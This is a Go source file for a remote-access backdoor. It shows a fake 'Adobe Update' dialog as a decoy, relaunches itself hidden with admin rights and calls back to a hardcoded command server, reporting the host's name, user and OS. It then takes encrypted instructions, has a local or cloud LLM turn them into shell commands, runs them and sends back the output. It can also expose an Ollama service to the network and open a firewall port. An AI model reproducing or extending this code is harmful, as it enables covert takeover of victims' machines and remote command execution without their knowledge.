package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"golang.org/x/text/encoding/charmap"
)

const (
	SERVER_ADDR          = "192.168.56.1:9000"
	daemonFlag           = "-daemon"
	LOCK_PORT            = 39871
	CMD_TIMEOUT          = 30 * time.Second
	OLLAMA_LOCAL_API     = "http://localhost:11434/api/chat"
	MODEL_CMD_PREFIX     = "!MODEL "
	SETUP_LLM_PREFIX     = "!SETUP_LLM"
	MASTER_URL_PREFIX    = "!MASTER_URL "
	MASTER_MODEL_PREFIX  = "!MASTER_MODEL "
	CLEAR_MASTER_URL_CMD = "!CLEAR_MASTER_URL"
	GROQ_API_URL         = "https://api.groq.com/openai/v1/chat/completions"
)

var (
	lockListener   net.Listener
	ollamaBaseURL  string = OLLAMA_LOCAL_API
	effectiveModel string
	masterModel    string
	groqApiKey     string
	groqModel      string
	currentAIMode  string = "ollama"
)

type OllamaChatRequest struct {
	Model    string `json:"model"`
	Messages []struct {
		Role    string `json:"role"`
		Content string `json:"content"`
	} `json:"messages"`
	Stream  bool                   `json:"stream"`
	Options map[string]interface{} `json:"options,omitempty"`
}

type OllamaChatResponse struct {
	Message struct {
		Content string `json:"content"`
	} `json:"message"`
	Error string `json:"error,omitempty"`
}

type GroqMessage struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type GroqRequest struct {
	Model       string        `json:"model"`
	Messages    []GroqMessage `json:"messages"`
	Temperature float64       `json:"temperature,omitempty"`
	MaxTokens   int           `json:"max_tokens,omitempty"`
}

type GroqResponse struct {
	Choices []struct {
		Message struct {
			Content string `json:"content"`
		} `json:"message"`
	} `json:"choices"`
	Error *struct {
		Message string `json:"message"`
	} `json:"error,omitempty"`
}

type CommandResult struct {
	Prompt  string `json:"prompt"`
	Command string `json:"command"`
	Output  string `json:"output"`
}

type SetupProgress struct {
	Type    string `json:"type"`
	Stage   string `json:"stage"`
	Status  string `json:"status"`
	Message string `json:"message,omitempty"`
}

type MasterInfoData struct {
	Type         string   `json:"type"`
	Models       []string `json:"models"`
	CurrentModel string   `json:"current_model"`
}

type ClientSyncInfo struct {
	Type         string   `json:"type"`
	Models       []string `json:"models"`
	CurrentModel string   `json:"current_model"`
}

func main() {
	if runtime.GOOS == "windows" {
		if !isAdmin() {
			relaunchAsAdmin()
			return
		}
	} else {
		if !isAdmin() {
			fmt.Println("This program must be run as root.")
			os.Exit(1)
		}
	}

	if !isDaemon() {
		showFakeUpdate()
		launchDaemon()
		return
	}
	if err := acquireLock(); err != nil {
		return
	}
	defer releaseLock()
	runClient()
}

func isDaemon() bool {
	for _, arg := range os.Args {
		if arg == daemonFlag {
			return true
		}
	}
	return false
}

func acquireLock() error {
	var err error
	lockListener, err = net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", LOCK_PORT))
	return err
}

func releaseLock() {
	if lockListener != nil {
		lockListener.Close()
	}
}

func showFakeUpdate() {
	switch runtime.GOOS {
	case "windows":
		vbs := `Set WshShell = CreateObject("WScript.Shell")
WshShell.Popup "Checking for updates...", 3, "Adobe Update", 64
WScript.Sleep 3000
WshShell.Popup "Installing update...", 3, "Adobe Update", 64`
		tmpFile := filepath.Join(os.TempDir(), "update.vbs")
		os.WriteFile(tmpFile, []byte(vbs), 0644)
		cmd := exec.Command("wscript", tmpFile)
		setSysProcAttrForFakeUpdate(cmd)
		cmd.Start()
		go func() {
			time.Sleep(6 * time.Second)
			os.Remove(tmpFile)
		}()
	case "linux":
		if _, err := exec.LookPath("zenity"); err == nil {
			exec.Command("zenity", "--info", "--text=Checking for updates...", "--title=Adobe Update", "--timeout=3").Run()
			exec.Command("zenity", "--info", "--text=Installing update...", "--title=Adobe Update", "--timeout=2").Run()
		} else {
			fmt.Println("Checking for updates...")
			time.Sleep(3 * time.Second)
			fmt.Println("Installing update...")
			time.Sleep(2 * time.Second)
		}
	default:
		fmt.Println("Checking for updates...")
		time.Sleep(3 * time.Second)
		fmt.Println("Installing update...")
		time.Sleep(2 * time.Second)
	}
}

func launchDaemon() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exe, daemonFlag)
	setSysProcAttrForDaemon(cmd)
	cmd.Start()
}

func executeCommand(cmdStr string) string {
	ctx, cancel := context.WithTimeout(context.Background(), CMD_TIMEOUT)
	defer cancel()
	return runCommand(ctx, cmdStr)
}

func executeCommandWithTimeout(cmdStr string, timeout time.Duration) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	out, err := runCommandWithError(ctx, cmdStr)
	return out, err
}

func executeCommandNoTimeout(cmdStr string) (string, error) {
	return runCommandWithError(context.Background(), cmdStr)
}

func runCommand(ctx context.Context, cmdStr string) string {
	out, _ := runCommandWithError(ctx, cmdStr)
	return out
}

func runCommandWithError(ctx context.Context, cmdStr string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		tmpFile, err := os.CreateTemp("", "cmd_*.bat")
		if err != nil {
			return "", fmt.Errorf("creating temp file: %w", err)
		}
		defer os.Remove(tmpFile.Name())
		if _, err := tmpFile.WriteString("@echo off\r\n" + cmdStr + "\r\n"); err != nil {
			return "", fmt.Errorf("writing temp file: %w", err)
		}
		tmpFile.Close()
		cmd = exec.CommandContext(ctx, "cmd", "/C", tmpFile.Name())
		setCmdSysProcAttr(cmd)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}
	rawOutput, err := cmd.CombinedOutput()
	if runtime.GOOS == "windows" {
		if decoded, decErr := charmap.CodePage850.NewDecoder().Bytes(rawOutput); decErr == nil {
			rawOutput = decoded
		}
	}
	if err != nil {
		return string(rawOutput), fmt.Errorf("command failed: %w", err)
	}
	return string(rawOutput), nil
}

func getAvailableModels() ([]string, error) {
	cmd := exec.Command("ollama", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("ollama list failed: %v", err)
	}
	lines := strings.Split(string(output), "\n")
	var models []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "NAME") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) >= 1 {
			models = append(models, fields[0])
		}
	}
	return models, nil
}

func getStoredModel() string {
	path := modelFilePath()
	if data, err := os.ReadFile(path); err == nil {
		model := strings.TrimSpace(string(data))
		if model != "" {
			return model
		}
	}
	models, err := getAvailableModels()
	if err != nil || len(models) == 0 {
		return ""
	}
	return models[0]
}

func storeModel(model string) {
	path := modelFilePath()
	os.MkdirAll(filepath.Dir(path), 0700)
	os.WriteFile(path, []byte(model), 0600)
}

func modelFilePath() string {
	if configDir, err := os.UserConfigDir(); err == nil && configDir != "" {
		return filepath.Join(configDir, "tcpclient", "current_model")
	}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		return filepath.Join(home, ".tcpclient_current_model")
	}
	return ".current_model"
}

func queryOllama(prompt string) (string, error) {
	reqBody := OllamaChatRequest{
		Model: effectiveModel,
		Messages: []struct {
			Role    string `json:"role"`
			Content string `json:"content"`
		}{
			{Role: "system", Content: "You are a precise command-line assistant. Output ONLY the raw command line, without any markdown formatting, backticks, quotes, or explanations. The command must be a single line valid for the target operating system indicated by the user."},
			{Role: "user", Content: prompt},
		},
		Stream:  false,
		Options: map[string]interface{}{"temperature": 1.0},
	}
	data, err := json.Marshal(reqBody)
	if err != nil {
		return "", err
	}
	client := &http.Client{Timeout: 120 * time.Second}
	req, err := http.NewRequest(http.MethodPost, ollamaBaseURL, bytes.NewBuffer(data))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return "", fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	var out OllamaChatResponse
	if err := json.Unmarshal(body, &out); err != nil {
		return "", err
	}
	if out.Error != "" {
		return "", fmt.Errorf("Ollama error: %s", out.Error)
	}
	return strings.TrimSpace(out.Message.Content), nil
}

func queryGroq(prompt string) (string, error) {
	reqBody := GroqRequest{
		Model: groqModel,
		Messages: []GroqMessage{
			{Role: "system", Content: "You are a precise command-line assistant. Output ONLY the raw command line, without any markdown formatting, backticks, quotes, or explanations. The command must be a single line valid for the target operating system indicated by the user."},
			{Role: "user", Content: prompt},
		},
		Temperature: 1.0,
		MaxTokens:   1024,
	}
	data, err := json.Marshal(reqBody)
	if err != nil {
		return "", err
	}
	client := &http.Client{Timeout: 120 * time.Second}
	req, err := http.NewRequest(http.MethodPost, GROQ_API_URL, bytes.NewBuffer(data))
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Bearer "+groqApiKey)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return "", fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	var out GroqResponse
	if err := json.Unmarshal(body, &out); err != nil {
		return "", err
	}
	if out.Error != nil {
		return "", fmt.Errorf("Groq API error: %s", out.Error.Message)
	}
	if len(out.Choices) == 0 {
		return "", errors.New("no choices in response")
	}
	return strings.TrimSpace(out.Choices[0].Message.Content), nil
}

func runClient() {
	for {
		conn, err := net.Dial("tcp", SERVER_ADDR)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		scanner := bufio.NewScanner(conn)
		writer := bufio.NewWriter(conn)
		sessionKey, masterIP, masterModelReceived, err := performHandshake(conn, scanner)
		if err != nil {
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}
		if masterIP != "" {
			ollamaBaseURL = "http://" + masterIP + ":11434/api/chat"
			if masterModelReceived != "" {
				masterModel = masterModelReceived
				effectiveModel = masterModelReceived
			}
		}
		currentModel := getStoredModel()
		if effectiveModel == "" {
			effectiveModel = currentModel
		}

		for scanner.Scan() {
			line := scanner.Text()
			var cmdJSON struct {
				Sig    string `json:"sig"`
				Cipher string `json:"cipher"`
			}
			if err := json.Unmarshal([]byte(line), &cmdJSON); err != nil {
				continue
			}
			sig, _ := base64.StdEncoding.DecodeString(cmdJSON.Sig)
			payload, _ := base64.StdEncoding.DecodeString(cmdJSON.Cipher)
			if err := verifySignature(payload, sig); err != nil {
				continue
			}
			nonce := payload[:12]
			ciphertextTag := payload[12:]
			block, _ := aes.NewCipher(sessionKey)
			aesgcm, _ := cipher.NewGCM(block)
			plaintext, err := aesgcm.Open(nil, nonce, ciphertextTag, nil)
			if err != nil {
				continue
			}
			prompt := string(plaintext)

			if strings.HasPrefix(prompt, "!MODE_GROQ ") {
				parts := strings.SplitN(strings.TrimPrefix(prompt, "!MODE_GROQ "), " ", 2)
				groqApiKey = parts[0]
				if len(parts) > 1 {
					groqModel = parts[1]
				}
				currentAIMode = "groq"
				continue
			}
			if prompt == "!MODE_OLLAMA" {
				currentAIMode = "ollama"
				continue
			}

			if prompt == SETUP_LLM_PREFIX {
				runLLMSetup(writer, sessionKey)
				continue
			}
			if strings.HasPrefix(prompt, MASTER_URL_PREFIX) {
				addr := strings.TrimPrefix(prompt, MASTER_URL_PREFIX)
				ollamaBaseURL = "http://" + addr + ":11434/api/chat"
				continue
			}
			if strings.HasPrefix(prompt, MASTER_MODEL_PREFIX) {
				model := strings.TrimPrefix(prompt, MASTER_MODEL_PREFIX)
				masterModel = model
				effectiveModel = model
				continue
			}
			if prompt == CLEAR_MASTER_URL_CMD {
				ollamaBaseURL = OLLAMA_LOCAL_API
				currentModel = getStoredModel()
				effectiveModel = currentModel
				masterModel = ""
				continue
			}

			var result CommandResult
			if strings.HasPrefix(prompt, MODEL_CMD_PREFIX) {
				newModel := strings.TrimPrefix(prompt, MODEL_CMD_PREFIX)
				newModel = strings.TrimSpace(newModel)

				result.Prompt = prompt
				result.Command = "ollama model set"

				if newModel != "" {
					availableModels, err := getAvailableModels()
					if err != nil {
						result.Output = fmt.Sprintf("Failed to list models: %v", err)
					} else {
						modelExists := false
						for _, m := range availableModels {
							if m == newModel {
								modelExists = true
								break
							}
						}
						if !modelExists {
							result.Output = fmt.Sprintf("Model %s not found in local Ollama", newModel)
						} else {
							storeModel(newModel)
							currentModel = newModel
							if ollamaBaseURL == OLLAMA_LOCAL_API {
								effectiveModel = currentModel
							}
							result.Output = fmt.Sprintf("Model changed to %s", newModel)
						}
						sendClientSync(writer, sessionKey, availableModels, currentModel)
					}
				} else {
					result.Output = "Invalid model name"
				}
				sendResult(writer, sessionKey, result)
				continue
			} else {
				result.Prompt = prompt
				if currentAIMode == "groq" {
					aiCommand, err := queryGroq(prompt)
					if err != nil {
						result.Command = ""
						result.Output = fmt.Sprintf("Groq error: %v", err)
					} else if aiCommand == "" {
						result.Command = ""
						result.Output = "Groq returned empty command"
					} else {
						result.Command = aiCommand
						result.Output = executeCommand(aiCommand)
					}
				} else {
					if effectiveModel == "" {
						result.Command = ""
						result.Output = "No model configured"
					} else {
						aiCommand, err := queryOllama(prompt)
						if err != nil {
							result.Command = ""
							result.Output = fmt.Sprintf("Ollama error: %v", err)
						} else if aiCommand == "" {
							result.Command = ""
							result.Output = "Ollama returned empty command"
						} else {
							result.Command = aiCommand
							result.Output = executeCommand(aiCommand)
						}
					}
				}
			}
			sendResult(writer, sessionKey, result)
		}
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func sendResult(writer *bufio.Writer, sessionKey []byte, result CommandResult) {
	jsonResult, _ := json.Marshal(result)
	encOutput := encryptOutput(sessionKey, string(jsonResult))
	fmt.Fprintln(writer, encOutput)
	writer.Flush()
}

func sendSetupProgress(writer *bufio.Writer, sessionKey []byte, progress SetupProgress) {
	data, _ := json.Marshal(progress)
	encOutput := encryptOutput(sessionKey, string(data))
	fmt.Fprintln(writer, encOutput)
	writer.Flush()
}

func sendMasterInfo(writer *bufio.Writer, sessionKey []byte, info MasterInfoData) {
	data, _ := json.Marshal(info)
	encOutput := encryptOutput(sessionKey, string(data))
	fmt.Fprintln(writer, encOutput)
	writer.Flush()
}

func sendClientSync(writer *bufio.Writer, sessionKey []byte, models []string, currentModel string) {
	info := ClientSyncInfo{
		Type:         "client_model_sync",
		Models:       models,
		CurrentModel: currentModel,
	}
	data, _ := json.Marshal(info)
	encOutput := encryptOutput(sessionKey, string(data))
	fmt.Fprintln(writer, encOutput)
	writer.Flush()
}

func performHandshake(conn net.Conn, scanner *bufio.Scanner) ([]byte, string, string, error) {
	suggestedID := getStoredClientID()
	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "unknown"
	}
	username := getUsername()
	osName := runtime.GOOS

	fmt.Fprintln(conn, "[SYSTEM INFO]")
	fmt.Fprintf(conn, "Client ID: %s\n", suggestedID)
	fmt.Fprintf(conn, "OS: %s\n", osName)
	fmt.Fprintf(conn, "Hostname: %s\n", hostname)
	fmt.Fprintf(conn, "User: %s\n", username)
	fmt.Fprintln(conn, "[END SYSTEM INFO]")

	models, _ := getAvailableModels()
	fmt.Fprintln(conn, "[MODELS]")
	for _, m := range models {
		fmt.Fprintln(conn, m)
	}
	fmt.Fprintln(conn, "[END MODELS]")
	currentModel := getStoredModel()
	if currentModel == "" {
		models, _ := getAvailableModels()
		if len(models) > 0 {
			currentModel = models[0]
			storeModel(currentModel)
		}
	}
	fmt.Fprintf(conn, "CURRENT_MODEL:%s\n", currentModel)

	sessionKey := make([]byte, 32)
	if _, err := rand.Read(sessionKey); err != nil {
		return nil, "", "", err
	}

	serverPubKey, err := parseServerPublicKey()
	if err != nil {
		return nil, "", "", err
	}

	encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, serverPubKey, sessionKey)
	if err != nil {
		return nil, "", "", err
	}
	encKeyB64 := base64.StdEncoding.EncodeToString(encryptedKey)
	fmt.Fprintf(conn, "SESSION_KEY:%s\n", encKeyB64)

	if !scanner.Scan() {
		return nil, "", "", errors.New("no response from server")
	}
	responseLine := strings.TrimSpace(scanner.Text())
	if !strings.HasPrefix(responseLine, "ASSIGNED_ID:") {
		return nil, "", "", errors.New("invalid handshake response")
	}
	assignedID := strings.TrimPrefix(responseLine, "ASSIGNED_ID:")
	if assignedID != "" && assignedID != suggestedID {
		storeClientID(assignedID)
	}

	masterIP := ""
	masterModelReceived := ""
	if scanner.Scan() {
		masterLine := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(masterLine, "MASTER:") {
			masterIP = strings.TrimPrefix(masterLine, "MASTER:")
			if masterIP == "none" {
				masterIP = ""
			} else if scanner.Scan() {
				modelLine := strings.TrimSpace(scanner.Text())
				if strings.HasPrefix(modelLine, "MASTER_MODEL:") {
					masterModelReceived = strings.TrimPrefix(modelLine, "MASTER_MODEL:")
				}
			}
		}
	}

	return sessionKey, masterIP, masterModelReceived, nil
}

func parseServerPublicKey() (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(serverPublicKeyPEM))
	if block == nil {
		return nil, errors.New("failed to parse public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("not RSA public key")
	}
	return rsaPub, nil
}

func encryptOutput(key []byte, output string) string {
	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, 12)
	rand.Read(nonce)
	ciphertext := aesgcm.Seal(nil, nonce, []byte(output), nil)
	payload := append(nonce, ciphertext...)
	return base64.StdEncoding.EncodeToString(payload)
}

func verifySignature(payload, sig []byte) error {
	block, _ := pem.Decode([]byte(serverPublicKeyPEM))
	if block == nil {
		return errors.New("failed to parse public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return err
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return errors.New("not RSA public key")
	}
	hash := sha256.Sum256(payload)
	return rsa.VerifyPKCS1v15(rsaPub, crypto.SHA256, hash[:], sig)
}

func getStoredClientID() string {
	path := clientIDPath()
	if data, err := os.ReadFile(path); err == nil {
		id := strings.TrimSpace(string(data))
		if id != "" {
			return id
		}
	}
	return ""
}

func storeClientID(id string) {
	path := clientIDPath()
	os.MkdirAll(filepath.Dir(path), 0700)
	os.WriteFile(path, []byte(id), 0600)
}

func clientIDPath() string {
	if configDir, err := os.UserConfigDir(); err == nil && configDir != "" {
		return filepath.Join(configDir, "tcpclient", "client_id")
	}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		return filepath.Join(home, ".tcpclient_client_id")
	}
	return ".client_id"
}

func getUsername() string {
	if u, err := user.Current(); err == nil && u.Username != "" {
		return u.Username
	}
	if v := os.Getenv("USERNAME"); v != "" {
		return v
	}
	if v := os.Getenv("USER"); v != "" {
		return v
	}
	return "unknown"
}

func runLLMSetup(writer *bufio.Writer, sessionKey []byte) {
	sendProgress := func(stage, status, message string) {
		progress := SetupProgress{
			Type:    "master_setup_progress",
			Stage:   stage,
			Status:  status,
			Message: message,
		}
		sendSetupProgress(writer, sessionKey, progress)
	}

	sendProgress("start", "running", "LLM environment setup started")

	out, err := executeCommandWithTimeout("ollama --version", 5*time.Second)
	if err != nil {
		if runtime.GOOS == "windows" {
			sendProgress("checking_ollama", "running", "Ollama not found, installing prerequisites")
			out, err := executeCommandWithTimeout(`powershell -Command "(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Where-Object {$_.DisplayName -match 'Visual C\+\+ 2022.*X64'}).DisplayName"`, 10*time.Second)
			if err == nil && strings.TrimSpace(out) != "" {
				sendProgress("checking_vcredist", "running", "Visual C++ Redistributable found")
			} else {
				sendProgress("installing_vcredist", "running", "Installing Visual C++ Redistributable")
				tmpDir := os.TempDir()
				installerPath := filepath.Join(tmpDir, "vc_redist.x64.exe")
				if err := downloadFile("https://aka.ms/vc14/vc_redist.x64.exe", installerPath); err != nil {
					sendProgress("installing_vcredist", "error", fmt.Sprintf("Download failed: %v", err))
					return
				}
				defer os.Remove(installerPath)
				_, instErr := executeCommandWithTimeout(installerPath+" /install /quiet /norestart", 5*time.Minute)
				if instErr != nil {
					if exitErr, ok := instErr.(*exec.ExitError); ok {
						if status, ok := exitErr.Sys().(syscall.WaitStatus); ok {
							if status.ExitStatus() == 3010 {
								sendProgress("installing_vcredist", "reboot_required", "Reboot required, setup cannot continue")
								return
							}
						}
					}
					sendProgress("installing_vcredist", "error", fmt.Sprintf("Installation failed: %v", instErr))
					return
				}
				sendProgress("installing_vcredist", "done", "VC++ Redistributable installed")
			}

			sendProgress("installing_ollama", "running", "Installing Ollama via winget")
			executeCommandNoTimeout("winget install -e --id Ollama.Ollama --source winget --accept-package-agreements --accept-source-agreements --silent")
			if err := refreshEnvPath(); err != nil {
				sendProgress("installing_ollama", "warning", "Failed to refresh PATH")
			}
			time.Sleep(2 * time.Second)
			daemonReady := false
			for attempt := 0; attempt < 15; attempt++ {
				_, err := executeCommandWithTimeout("ollama list", 2*time.Second)
				if err == nil {
					daemonReady = true
					break
				}
				time.Sleep(2 * time.Second)
			}
			if !daemonReady {
				sendProgress("installing_ollama", "error", "Ollama daemon did not become ready")
				return
			}
			sendProgress("installing_ollama", "done", "Ollama installed")
		} else if runtime.GOOS == "linux" {
			ensureCurl()
			sendProgress("installing_ollama", "running", "Installing Ollama via curl")
			out, err := executeCommandNoTimeout("curl -fsSL https://ollama.com/install.sh | sh")
			if err != nil {
				sendProgress("installing_ollama", "error", fmt.Sprintf("Installation failed: %v", err))
				return
			}
			sendProgress("installing_ollama", "done", out)
			time.Sleep(2 * time.Second)
			daemonReady := false
			for attempt := 0; attempt < 15; attempt++ {
				_, listErr := executeCommandWithTimeout("ollama list", 2*time.Second)
				if listErr == nil {
					daemonReady = true
					break
				}
				time.Sleep(2 * time.Second)
			}
			if !daemonReady {
				sendProgress("installing_ollama", "error", "Ollama daemon did not become ready")
				return
			}
		}
	} else {
		sendProgress("checking_ollama", "done", "Ollama is already installed")
	}

	out, err = executeCommandWithTimeout("ollama list", 5*time.Second)
	if err != nil {
		sendProgress("checking_models", "error", fmt.Sprintf("Cannot list models: %v", err))
		return
	}
	modelFound := checkModelExists(out)
	if modelFound {
		sendProgress("checking_models", "done", "A required model is already available")
	} else {
		sendProgress("pulling_model", "running", "Pulling qwen2.5-coder:7b")
		pullOut, err := executeCommandNoTimeout("ollama pull qwen2.5-coder:7b")
		if err != nil {
			sendProgress("pulling_model", "error", fmt.Sprintf("Failed to pull model: %v", err))
			return
		}
		sendProgress("pulling_model", "done", pullOut)
	}

	sendProgress("configuring_service", "running", "Configuring Ollama service for network access")
	configureOllamaService()

	time.Sleep(2 * time.Second)
	serviceReady := false
	for attempt := 0; attempt < 15; attempt++ {
		if _, err := executeCommandWithTimeout("ollama list", 2*time.Second); err == nil {
			serviceReady = true
			break
		}
		time.Sleep(2 * time.Second)
	}
	if !serviceReady {
		sendProgress("configuring_service", "warning", "Ollama service may not be fully ready")
	}

	progressFinal := SetupProgress{
		Type:    "master_setup_done",
		Stage:   "finished",
		Status:  "success",
		Message: "LLM Master environment ready",
	}
	sendSetupProgress(writer, sessionKey, progressFinal)

	model := getStoredModel()
	if model == "" {
		models, _ := getAvailableModels()
		if len(models) > 0 {
			model = models[0]
			storeModel(model)
		}
	}
	effectiveModel = model

	models, _ := getAvailableModels()
	info := MasterInfoData{
		Type:         "master_info_data",
		Models:       models,
		CurrentModel: model,
	}
	sendMasterInfo(writer, sessionKey, info)
}

func checkModelExists(listOutput string) bool {
	lines := strings.Split(listOutput, "\n")
	targetModels := []string{
		"deepseek-coder-v2:16b",
		"deepseek-coder:6.7b",
		"qwen2.5-coder:7b",
		"dolphin-llama3:8b",
	}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "NAME") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) == 0 {
			continue
		}
		for _, target := range targetModels {
			if fields[0] == target {
				return true
			}
		}
	}
	return false
}

func downloadFile(url, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("download request failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download failed with status: %s", resp.Status)
	}
	out, err := os.Create(filepath)
	if err != nil {
		return fmt.Errorf("creating file failed: %w", err)
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

func refreshEnvPath() error {
	if runtime.GOOS != "windows" {
		return nil
	}
	cmd := exec.Command("powershell", "-Command",
		"[System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')")
	out, err := cmd.Output()
	if err != nil {
		return err
	}
	newPath := strings.TrimSpace(string(out))
	return os.Setenv("PATH", newPath)
}

func configureOllamaService() {
	if runtime.GOOS == "linux" {
		commands := []string{
			"mkdir -p /etc/systemd/system/ollama.service.d",
			"printf '[Service]\\nEnvironment=OLLAMA_HOST=0.0.0.0:11434\\n' > /etc/systemd/system/ollama.service.d/override.conf",
			"systemctl daemon-reload",
			"systemctl restart ollama",
		}
		for _, command := range commands {
			executeCommand(command)
		}
	} else if runtime.GOOS == "windows" {
		commands := []string{
			`powershell -Command "Get-Process -Name '*ollama*' | Stop-Process -Force"`,
			`powershell -Command "[Environment]::SetEnvironmentVariable('OLLAMA_HOST', '0.0.0.0:11434', 'Machine')"`,
			`powershell -Command "New-NetFirewallRule -DisplayName 'Ollama 11434' -Direction Inbound -Protocol TCP -LocalPort 11434 -Action Allow"`,
			`powershell -Command "$env:OLLAMA_HOST='0.0.0.0:11434'; Start-Process -FilePath 'ollama' -ArgumentList 'serve' -WindowStyle Hidden"`,
		}
		for _, command := range commands {
			executeCommand(command)
		}
	}
}

const serverPublicKeyPEM = `-----BEGIN PUBLIC KEY-----
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXX
-----END PUBLIC KEY-----
`